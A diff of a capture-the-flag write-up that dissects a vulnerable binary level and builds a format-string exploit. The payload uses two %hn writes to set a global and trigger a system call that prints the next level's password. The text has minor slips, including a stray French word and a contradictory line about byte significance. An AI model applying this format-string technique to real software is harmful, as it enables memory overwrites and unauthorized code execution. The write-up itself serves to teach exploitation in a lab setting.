@@ -74,8 +74,11 @@ End of assembler dump.
    0x0804847a <+35>:    call   0x8048350 <fgets@plt>
 ```
 >`0x8049804 <stdin@@GLIBC_2.0>: 0xb7fd1ac0`
+
 >buffer size is 0x200 bytes
+
 >buffer starts at `-0x208(%ebp)`
+
 >Prompt the user for up to 512 bytes.
 
 ```
@@ -98,6 +101,7 @@ End of assembler dump.
    0x08048497 <+64>:    jne    0x80484a5 <n+78>
 ```
 >`0x8049810 <m>:  0x00000000`
+
 >After the call to `<p>`, compare the value located at `0x8049810` avec with the hexadecimal constant 102 5544 (16 930 116 in decimal). If the two values differ, we `leave` and then `ret`, otherwise we call `<system@plt>`.
 
 ```
@@ -105,6 +109,7 @@ End of assembler dump.
    0x080484a0 <+73>:    call   0x8048360 <system@plt>
 ```
 >`0x8048590: "/bin/cat /home/user/level5/.pass"`
+
 >Display our flag.
 
 
@@ -114,12 +119,15 @@ End of assembler dump.
 
 - It would work, but this time, let's break down this assignment of 4 bytes (`%n`) into two assignments of 2 bytes each (`%hn`). We need to write 16 930 116, which is 102 5544 in hexadecimal:
 >Low order bytes = 5544 (21 828 in decimal)
+
 >High order bytes = 0102 (258 in decimal)
 
 
 - Instead of making an assignment at `0x8049810`, we will make one at `0x8049810` and another one at `0x8049812`. `0x8049810` will contain the bytes representing the most significant value (here, the low-order bytes), and `0x8049812` will contain the bytes representing the least significant value (here, the high-order bytes).
 >`\x12\x98\x04\x08\x10\x98\x04\x08 %VALUE1x %12$hn %VALUE2x %13$hn`
+
 >`VALUE1 (0x8049812)` ==> 258 - 8 bytes for the addresses - 2 bytes for the spaces = 248
+
 >`VALUE2 (0x8049810)` ==> 21 828 - 258 - 2 bytes for the spaces = 21 568
 
 
